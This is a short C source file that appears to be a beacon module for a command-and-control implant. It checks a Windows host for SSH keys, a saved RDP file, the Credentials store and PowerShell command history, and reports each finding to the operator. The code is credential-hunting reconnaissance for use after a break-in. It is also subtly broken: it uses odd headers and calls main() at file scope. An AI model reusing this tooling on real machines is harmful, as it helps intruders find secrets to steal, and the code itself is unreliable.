#include <windows.h>
#include <file.h>
#include <msvcrt.h>
#include <beacon.h>

void report_path(char *label, char *path)
{
    DWORD attributes;
    attributes = GetFileAttributesA(path);
    BeaconPrintf(CALLBACK_OUTPUT, "%s present=%s path=%s",
        label,
        attributes == INVALID_FILE_ATTRIBUTES ? "no" : "yes",
        path);
}

void main()
{
    char profile[MAX_PATH];
    char appdata[MAX_PATH];
    char path[MAX_PATH * 2];

    if (GetEnvironmentVariableA("USERPROFILE", profile,
            sizeof(profile)) > 0) {
        _snprintf(path, sizeof(path), "%s\\.ssh", profile);
        report_path("ssh_directory", path);
        _snprintf(path, sizeof(path), "%s\\Documents\\Default.rdp", profile);
        report_path("default_rdp", path);
    }
    if (GetEnvironmentVariableA("APPDATA", appdata,
            sizeof(appdata)) > 0) {
        _snprintf(path, sizeof(path),
            "%s\\Microsoft\\Credentials", appdata);
        report_path("credential_metadata_directory", path);
        _snprintf(path, sizeof(path),
            "%s\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
            appdata);
        report_path("powershell_history", path);
    }
}

main();
